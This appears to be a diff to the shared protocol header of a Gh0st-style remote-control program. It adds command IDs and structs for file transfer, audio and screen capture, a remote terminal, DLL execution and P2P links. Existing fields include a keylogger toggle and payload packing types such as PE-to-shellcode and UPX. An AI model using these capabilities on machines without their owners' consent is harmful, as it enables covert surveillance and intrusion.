@@ -9,6 +9,7 @@
 #include <numeric>
 #include <ctime>
 #include <chrono>
+#include <climits>
 
 #ifdef _WIN32
 #define WIN32_LEAN_AND_MEAN
@@ -26,17 +27,19 @@
 #define WINAPI
 #define TRUE 1
 #define FALSE 0
-#define skCrypt(p)
+#define skCrypt(p) p
 #define Mprintf printf
 #define ASSERT(p)
-#define AUTO_TICK_C(p)
-#define AUTO_TICK(p)
+#define AUTO_TICK_C(p, q)
+#define AUTO_TICK(p, q)
+#define STOP_TICK
 #define OutputDebugStringA(p) printf(p)
 
 #include <unistd.h>
 #define Sleep(n) ((n) >= 1000 ? sleep((n) / 1000) : usleep((n) * 1000))
 
 typedef int64_t __int64;
+typedef uint16_t WORD;
 typedef uint32_t DWORD;
 typedef int BOOL, SOCKET;
 typedef unsigned int ULONG;
@@ -45,6 +48,11 @@ typedef void VOID;
 typedef unsigned char BYTE;
 typedef BYTE* PBYTE, * LPBYTE;
 typedef void* LPVOID, * HANDLE;
+typedef int32_t LONG;
+typedef struct {
+    LONG x;
+    LONG y;
+} POINT;
 
 #define GET_PROCESS(a1, a2)
 #define MVirtualFree(a1, a2, a3) delete[]a1
@@ -56,6 +64,7 @@ typedef void* LPVOID, * HANDLE;
 #define SOCKET_ERROR -1
 #define closesocket close
 #define CloseHandle(p)
+#define SAFE_CLOSE_HANDLE(p)
 #define CancelIo(p) close(reinterpret_cast<intptr_t>(p))
 #endif
 
@@ -66,6 +75,14 @@ typedef void* LPVOID, * HANDLE;
 #ifndef _MAX_PATH
 #define _MAX_PATH 260
 #endif
+
+// 屏幕类型（用于 ScreenSettings.ScreenType）
+enum ScreenType {
+    USING_GDI = 0,            // GDI 截屏
+    USING_DXGI = 1,           // DXGI 截屏
+    USING_VIRTUAL = 2,        // 虚拟桌面
+    USING_WINDOW_CAPTURE = 3, // 窗口捕获 (Graphics Capture API, Win10 1803+)
+};
 
 // 以下2个数字需全局唯一，否则在生成服务时会出问题
 
@@ -102,6 +119,9 @@ inline int isValid_10s()
 
 // 当程序功能明显发生变化时，应该更新这个值，以便对被控程序进行区分
 #define DLL_VERSION __DATE__		// DLL版本
+
+// 客户端能力位
+#define CLIENT_CAP_V2   0x0001      // 支持 V2 文件传输
 
 #define TALK_DLG_MAXLEN 1024		// 最大输入字符长度
 
@@ -201,9 +221,35 @@ enum {
     CMD_COMPRESS_FILES = 72,        // 压缩文件
     CMD_UNCOMPRESS_FILES = 73,      // 解压文件
     CMD_SCREEN_SIZE = 74,
-	CMD_FULL_SCREEN = 75,
+    CMD_FULL_SCREEN = 75,
     CMD_REMOTE_CURSOR = 76,
+    CMD_SCROLL_INTERVAL = 77,       // 滚动检测间隔
+    CMD_QUALITY_LEVEL = 78,         // 质量等级 (-1=自适应, 0-4=具体等级)
+    CMD_INSTRUCTION_SET = 79,
+    CMD_QUALITY_PROFILES = 80,      // 下发质量配置表 (1 + QUALITY_COUNT * sizeof(QualityProfile))
+    CMD_TERMINAL_RESIZE = 81,       // 终端尺寸调整: [cmd:1][cols:2][rows:2]
+    CMD_RESTORE_CONSOLE = 82,       // RDP会话归位（恢复控制台会话）
+    CMD_RESET_VIRTUAL_DESKTOP = 83, // 重置虚拟桌面（关闭所有窗口重新启动）
+    CMD_SWITCH_WINDOW = 84,         // 切换窗口（类似 Alt+Tab）
 
+    // V2 文件传输（C2C + 断点续传）
+    COMMAND_SEND_FILE_V2 = 85,      // V2 文件传输
+    COMMAND_FILE_RESUME = 86,       // V2 断点续传控制（响应）
+    COMMAND_CLIPBOARD_V2 = 87,      // V2 剪贴板请求（C2C）
+    COMMAND_FILE_QUERY_RESUME = 88, // V2 查询续传状态（请求）
+    COMMAND_C2C_PREPARE = 89,       // C2C 准备接收（通知目标捕获目录）
+    COMMAND_C2C_TEXT = 90,          // C2C 文本剪贴板: [cmd:1][dstClientID:8][textLen:4][text:N]
+    COMMAND_FILE_COMPLETE_V2 = 91,  // V2 文件完成校验: [cmd][transferID][fileIndex][fileSize][sha256]
+    COMMAND_C2C_PREPARE_RESP = 92,  // C2C 准备响应（返回目标目录给发送方）
+
+    CMD_CURSOR_IMAGE = 93,          // 自定义光标图像: [cmd:1][hash:4][hotX:2][hotY:2][w:1][h:1][BGRA:w*h*4]
+    CMD_DOWN_FILES_V2 = 94,         // V2下载请求: [cmd:1][targetDir\0][file1\0][file2\0]...[\0]
+
+    CMD_AUDIO_CTRL = 95,            // 音频控制: [cmd:1][enable:1][persist:1]
+    TOKEN_SCREEN_AUDIO = 96,        // 音频数据: [token:1][hasFormat:1][AudioFormat?][data]
+    COMMAND_SHARE_CANCEL = 97,
+
+    TOKEN_SCROLL_FRAME = 99,        // 滚动优化帧
     // 服务端发出的标识
     TOKEN_AUTH = 100,				// 要求验证
     TOKEN_HEARTBEAT,				// 心跳包
@@ -273,10 +319,13 @@ enum {
     CMD_SERVER_ADDR = 229,          // 主控地址
     TOKEN_ERROR = 230,              // 错误提示
     TOKEN_SHELL_DATA = 231,         // 终端结果
+    TOKEN_TERMINAL_START = 232,     // Linux PTY 终端开始 (WebView2 + xterm.js)
+    TOKEN_TERMINAL_CLOSE = 233,     // Linux PTY 终端关闭 (shell 退出)
     CMD_EXECUTE_DLL = 240,			// 执行代码
     TOKEN_CLIENT_MSG = 241,         // 客户端消息
     CMD_SET_GROUP = 242,            // 修改分组
     CMD_EXECUTE_DLL_NEW = 243,	    // 执行代码
+	CMD_PEER_TO_PEER = 244,         // P2P通信
 };
 
 enum MachineCommand {
@@ -421,7 +470,7 @@ enum ChatManager {
 };
 
 // 文件管理
-enum FileManager {
+enum _FileManager {
     COMMAND_COMPRESS_FILE_PARAM=220,
     COMMAND_FILES_SEARCH_START,
     COMMAND_FILES_SEARCH_STOP,
@@ -593,7 +642,11 @@ enum ClientCompressType {
     CLIENT_COMPRESS_SC_AES = 2,
     CLIENT_PE_TO_SEHLLCODE = 3,
     CLIENT_COMPRESS_SC_AES_OLD = 4,
+    CLIENT_SHELLCODE_BINARY = 5,
+    CLIENT_COMP_SC_AES_OLD_UPX = 6,
 };
+
+inline std::vector<std::string> StringToVector(const std::string& str, char ch, int reserved = 1);
 
 #pragma pack(push, 4)
 // 所连接的主控程序信息
@@ -642,7 +695,7 @@ public:
     void SetAdminId(const char* admin)
     {
         char buf[17] = { 0 };
-        std::strncpy(buf, admin, 16);
+        strncpy(buf, admin, 16);
         superAdmin = std::strtoull(buf, NULL, 16);
     }
     int GetHeaderEncType() const
@@ -671,6 +724,23 @@ public:
             Decrypt();
         }
         return szServerIP;
+    }
+    // 从分号分隔的多 IP 中随机选择一个
+    std::string GetRandomServerIP()
+    {
+        const char* ip = ServerIP();
+        if (ip == nullptr || strlen(ip) == 0) return "";
+        auto list = StringToVector(ip, ';');
+        if (list.empty()) return "";
+        return list[rand() % list.size()];
+    }
+    // 获取第一个 IP
+    std::string GetFirstServerIP()
+    {
+        const char* ip = ServerIP();
+        if (ip == nullptr || strlen(ip) == 0) return "";
+        auto list = StringToVector(ip, ';');
+        return list.empty() ? "" : list[0];
     }
     int ServerPort()
     {
@@ -762,7 +832,7 @@ struct PluginParam {
 };
 
 // 将字符串按指定字符分隔为向量
-inline std::vector<std::string> StringToVector(const std::string& str, char ch, int reserved = 1)
+inline std::vector<std::string> StringToVector(const std::string& str, char ch, int reserved)
 {
     // 使用字符串流来分隔字符串
     std::istringstream stream(str);
@@ -776,6 +846,21 @@ inline std::vector<std::string> StringToVector(const std::string& str, char ch, 
     while (result.size() < reserved)
         result.push_back("");
 
+    return result;
+}
+
+inline bool VectorContains(const std::vector<std::string>& v, const std::string& elem) {
+    for (const auto& s : v)
+        if (s == elem) return true;
+    return false;
+}
+
+inline std::string VectorJoin(const std::vector<std::string>& v, char ch) {
+    std::string result;
+    for (size_t i = 0; i < v.size(); ++i) {
+        if (i > 0) result += ch;
+        result += v[i];
+    }
     return result;
 }
 
@@ -795,10 +880,10 @@ enum LOGIN_RES {
     RES_EXE_VERSION = 12,					// EXE版本
     RES_USERNAME = 13,                      // 电脑用户名称
     RES_ISADMIN = 14,                       // 是否具有管理员权限
-	RES_RESOLUTION = 15,                    // 屏幕分辨率
-	RES_CLIENT_ID = 16,                     // 客户端唯一ID
-	RES_PID = 17,                           // 进程ID
-	RES_FILESIZE = 18,                       // 文件大小
+    RES_RESOLUTION = 15,                    // 屏幕分辨率
+    RES_CLIENT_ID = 16,                     // 客户端唯一ID
+    RES_PID = 17,                           // 进程ID
+    RES_FILESIZE = 18,                       // 文件大小
     RES_MAX,
 };
 
@@ -823,7 +908,7 @@ typedef struct  LOGIN_INFOR {
     {
         memset(this, 0, sizeof(LOGIN_INFOR));
         bToken = TOKEN_LOGIN;
-        strcpy_s(moduleVersion, DLL_VERSION);
+        sprintf_s(moduleVersion, "%s-%04X", DLL_VERSION, CLIENT_CAP_V2);
     }
     LOGIN_INFOR& Speed(unsigned long speed)
     {
@@ -869,6 +954,12 @@ inline uint64_t GetUnixMs()
     return system_ms.time_since_epoch().count();
 }
 
+enum AuthStatus {
+	UNAUTHORIZED = 0,		        // 未授权
+	AUTHED_BY_SUPER = 1,			// 由超级管理员授权
+	AUTHED_BY_ADMIN = 2,		    // 由管理员授权
+};
+
 // 固定1024字节
 typedef struct Heartbeat {
     uint64_t Time;
@@ -877,8 +968,9 @@ typedef struct Heartbeat {
     int HasSoftware;
     char SN[20];
     char Passcode[44];
-    uint64_t PwdHmac;
-    char Reserved[424];
+    uint64_t PwdHmac;           // V1 HMAC (8 bytes), 如果为0则检查 PwdHmacV2
+    char PwdHmacV2[96];         // V2 HMAC 字符串 "v2:BASE64..." (如果 PwdHmac == 0)
+    char Reserved[328];         // 424 - 96 = 328
 
     Heartbeat()
     {
@@ -886,10 +978,10 @@ typedef struct Heartbeat {
     }
     Heartbeat(const std::string& s, int ping = 0)
     {
+        memset(this, 0, sizeof(Heartbeat));
         Time = GetUnixMs();
         strcpy_s(ActiveWnd, s.c_str());
         Ping = ping;
-        memset(Reserved, 0, sizeof(Reserved));
     }
     int Size() const
     {
@@ -900,9 +992,14 @@ typedef struct Heartbeat {
 typedef struct HeartbeatACK {
     uint64_t Time;
     char Authorized;
-    char Reserved[23];
+    char IsTrail;
+    char Authorization[200];
+    char Reserved[814];
 } HeartbeatACK;
 
+#define HeartbeatACK_OldSize 32
+
+#pragma pack(push, 4)
 // 固定500字节
 typedef struct MasterSettings {
     int         ReportInterval;             // 上报间隔
@@ -913,21 +1010,130 @@ typedef struct MasterSettings {
     char		WalletAddress[472];			// Wallets
     int         EnableKBLogger;             // Since 2025-11-27
     int         EnableLog;                  // Since 2025-12-17
-    char        Reserved[492];              // Since 2025-11-27
+    char        Signature[64];              // Since 2026-02-05
+    char        FeedbackUrl[80];            // Since 2026-04-08
+    char        HelpUrl[80];                // Since 2026-04-08
+    char        RequestAuthUrl[80];         // Since 2026-04-08
+    char        GetPluginUrl[80];           // Since 2026-04-08
+    char        Reserved[108];              // Since 2025-11-27
 } MasterSettings;
+#pragma pack(pop)
 
 #define MasterSettingsOldSize 500
 
+// 屏幕能力标志
+#define CAP_SCROLL_DETECT  0x0001           // 支持滚动检测优化
+
+// 滚动方向常量
+#define SCROLL_DIR_UP       0               // 向上滚动（屏幕内容向下移）
+#define SCROLL_DIR_DOWN     1               // 向下滚动（屏幕内容向上移）
+
+// 自适应质量等级
+enum QualityLevel {
+    QUALITY_DISABLED = -2, // 关闭质量控制（使用原有算法设置）
+    QUALITY_ADAPTIVE = -1, // 自适应模式
+    QUALITY_ULTRA   = 0,  // 极佳 (局域网, DIFF)
+    QUALITY_HIGH    = 1,  // 优秀 (RGB565)
+    QUALITY_GOOD    = 2,  // 良好 (H264, 1080P)
+    QUALITY_MEDIUM  = 3,  // 一般 (H264, 900P)
+    QUALITY_LOW     = 4,  // 较差 (H264, 720P)
+    QUALITY_MINIMAL = 5,  // 最低 (H264, 540P)
+    QUALITY_COUNT   = 6,
+};
+
+/* 质量配置(与 QualityLevel 对应)
+- strategy = 0：1080p 限制
+- strategy = 1：原始分辨率
+- strategy = 2 + maxWidth > 0：自定义宽度
+- strategy = 2 + maxWidth = 0：回退到用户保存的 strategy（0 或 1）
+*/
+struct QualityProfile {
+    int maxFPS;           // 最大帧率
+    int maxWidth;         // 最大宽度 (0=不限)
+    int algorithm;        // 压缩算法: 0=GRAY, 1=DIFF, 2=H264, 3=RGB565
+    int bitRate;          // kbps - H264
+};
+
+// 控制端使用，客户端优先从配置中读取
+inline const QualityProfile& GetQualityProfile(int level) {
+    // 预定义质量配置: algorithm: 0=GRAY, 1=DIFF, 2=H264, 3=RGB565
+    // 注意: level 必须在 [0, QUALITY_COUNT) 范围内
+    static const QualityProfile g_QualityProfiles[QUALITY_COUNT] = {
+        {25, 0,    1, 0   },  // Ultra:   25FPS, 原始,  DIFF     (局域网办公)
+        {20, 0,    3, 0   },  // High:    20FPS, 原始,  RGB565   (一般办公)
+        {20, 1920, 2, 3000},  // Good:    20FPS, 1080P, H264     (跨网/偶尔视频)
+        {15, 1600, 2, 2000},  // Medium:  15FPS, 900P,  H264
+        {12, 1280, 2, 1200},  // Low:     12FPS, 720P,  H264
+        {8,  1024, 2, 800 },  // Minimal: 8FPS,  540P,  H264     (极差网络)
+    };
+    if (level < 0 || level >= QUALITY_COUNT) {
+        static const QualityProfile disabled = {0, 0, -1, 0};  // 关闭模式返回空配置
+        return disabled;
+    }
+    return g_QualityProfiles[level];
+}
+
+// 根据RTT获取目标质量等级 (控制端使用)
+inline int GetTargetQualityLevel(int rtt, int usingFRP) {
+    // 根据模式应用不同 RTT阈值 (毫秒)
+    static const int g_RttThresholds[2][QUALITY_COUNT] = {
+        // 直连:    ULTRA, HIGH, GOOD, MEDIUM, LOW, MINIMAL
+        /* DIRECT */ { 30,   80,  150,   250,  400, INT_MAX },
+        // FRP:
+        /* PROXY  */ { 60,  160,  300,   500,  800, INT_MAX },
+    };
+    for (int i = 0; i < QUALITY_COUNT; i++) {
+        if (rtt < g_RttThresholds[usingFRP][i])
+            return i;
+    }
+    return QUALITY_MINIMAL;
+}
+
 typedef struct ScreenSettings {
-	int         MaxFPS;                     // 最大帧率
-	int         CompressThread;             // 压缩线程数
-	int         ScreenStrategy;             // 屏幕策略
-	int         ScreenWidth;                // 屏幕宽度
-	int         ScreenHeight;               // 屏幕高度
-	int         FullScreen;                 // 全屏模式
-    int         RemoteCursor;               // 使用远程光标
-	char        Reserved[72];               // 保留字段
-} ScreenSettings;
+    int         MaxFPS;                     // 偏移 0,  最大帧率
+    int         CompressThread;             // 偏移 4,  压缩线程数
+    int         ScreenStrategy;             // 偏移 8,  屏幕策略
+    int         ScreenWidth;                // 偏移 12, 屏幕宽度
+    int         ScreenHeight;               // 偏移 16, 屏幕高度
+    int         FullScreen;                 // 偏移 20, 全屏模式
+    int         RemoteCursor;               // 偏移 24, 使用远程光标
+    int         ScrollDetectInterval;       // 偏移 28, 滚动检测间隔（0=禁用, 1=每帧, 2=每2帧, ...）
+    int         QualityLevel;               // 偏移 32, 质量等级 (-1=自适应, 0=Ultra, 1=High, ..., 4=Minimal)
+    int         CpuSpeedup;                 // 偏移 36, 指令集加速(0: 无, 1: SSE2)
+    int         ScreenType;                 // 偏移 40, 屏幕类型(0: GDI, 1: DXGI, 2: Virtual)
+    int         AudioEnabled;               // 偏移 44, 音频传输(0: 禁用, 1: 启用)
+    char        Reserved[48];               // 偏移 48, 保留字段（新能力参数从此处扩展）
+    uint32_t    Capabilities;               // 偏移 96, 能力位标志（放最后）
+} ScreenSettings;                           // 总大小 100 字节
+
+// 音频控制常量
+#define CYCLEAUDIO_DISABLE    0             // 停止音频
+#define CYCLEAUDIO_ENABLE     1             // 启动音频
+
+// 音频控制命令结构 (服务端 → 客户端)
+#pragma pack(push, 1)
+struct AudioCtrlCmd {
+    BYTE  cmd;      // CMD_AUDIO_CTRL
+    BYTE  enable;   // 0=关闭, 1=开启
+    BYTE  persist;  // 1=保存到客户端配置
+};
+
+// 音频压缩类型
+enum AudioCompression {
+    AUDIO_COMPRESS_NONE = 0,  // 无压缩 (PCM)
+    AUDIO_COMPRESS_OPUS = 1,  // Opus 压缩
+};
+
+// 音频格式信息 (首次启用时随数据发送)
+struct AudioFormat {
+    WORD  channels;       // 声道数: 1=单声道, 2=立体声
+    DWORD sampleRate;     // 采样率: 44100 或 48000
+    WORD  bitsPerSample;  // 位深度: 16
+    WORD  blockAlign;     // 块对齐: channels * bitsPerSample / 8
+    BYTE  compression;    // 压缩类型: AudioCompression
+    BYTE  reserved;       // 保留字节 (对齐)
+};
+#pragma pack(pop)
 
 #pragma pack(push, 1)
 // 100字节: 运行类型 + 大小 + 调用方式 + DLL名称
@@ -955,7 +1161,7 @@ typedef struct DllExecuteInfoNew {
 } DllExecuteInfoNew;
 inline void SetParameters(DllExecuteInfoNew *p, char *param, int size)
 {
-    memcpy(p->Parameters, param, min(size, 400));
+    memcpy(p->Parameters, param, size < 400 ? size : 400);
 }
 
 typedef struct FrpcParam {
@@ -1059,9 +1265,10 @@ typedef struct Validation {
     char From[20];			// 开始日期
     char To[20];			// 结束日期
     char Admin[100];		// 管理员地址（当前主控的公网地址）
-    int Port;				// 管理员端口（默认当前端口）
-    char Checksum[16];		// 预留字段
-    Validation(float days, const char* admin, int port, const char* id="")
+    unsigned short Port;	// 管理员端口（默认当前端口）
+    unsigned short MaxDepth;// 最大生成深度（0=不可生成下级主控）
+    char Checksum[16];		// HMAC校验字段
+    Validation(float days, const char* admin, int port, const char* id="", unsigned short maxDepth=0)
     {
         time_t from = time(NULL), to = from + time_t(86400 * days);
         memset(this, 0, sizeof(Validation));
@@ -1070,7 +1277,8 @@ typedef struct Validation {
         strcpy_s(From, fromStr.c_str());
         strcpy_s(To, toStr.c_str());
         strcpy_s(Admin, admin);
-        Port = port;
+        Port = (unsigned short)port;
+        MaxDepth = maxDepth;
         if(strlen(id))memcpy(Checksum, id, 16);
     }
     bool IsValid() const
@@ -1078,6 +1286,7 @@ typedef struct Validation {
         std::string now = ToPekingTimeAsString(NULL);
         return From <= now && now <= To;
     }
+    bool CanGenerate() const { return MaxDepth > 0; }
 } Validation;
 
 #ifdef _DEBUG
@@ -1167,11 +1376,24 @@ public:
     uint64_t            time;
     POINT               pt;
 
+#ifdef _WIN32
     MSG64(const MSG& msg) :hwnd((uint64_t)msg.hwnd), message(msg.message), wParam(msg.wParam),
         lParam(msg.lParam), time(msg.time), pt(msg.pt) {}
 
     MSG64(const MSG32& msg) :hwnd((uint64_t)msg.hwnd), message(msg.message), wParam(msg.wParam),
         lParam(msg.lParam), time(msg.time), pt(msg.pt) {}
+
+    MSG64* Create(const MSG32* msg32)
+    {
+        hwnd = msg32->hwnd;
+        message = msg32->message;
+        wParam = msg32->wParam;
+        lParam = msg32->lParam;
+        time = msg32->time;
+        pt = msg32->pt;
+        return this;
+    }
+#endif
 
     MSG64(const void* buffer, int size)
     {
@@ -1185,17 +1407,6 @@ public:
     MSG64()
     {
         memset(this, 0, sizeof(MSG64));
-    }
-
-    MSG64* Create(const MSG32* msg32)
-    {
-        hwnd = msg32->hwnd;
-        message = msg32->message;
-        wParam = msg32->wParam;
-        lParam = msg32->lParam;
-        time = msg32->time;
-        pt = msg32->pt;
-        return this;
     }
 };
 
@@ -1222,7 +1433,7 @@ typedef struct CharMsg {
 } CharMsg;
 
 typedef struct ClientMsg {
-    char cmd;
+    unsigned char cmd;
     char title[31];
     char text[512];
     ClientMsg()
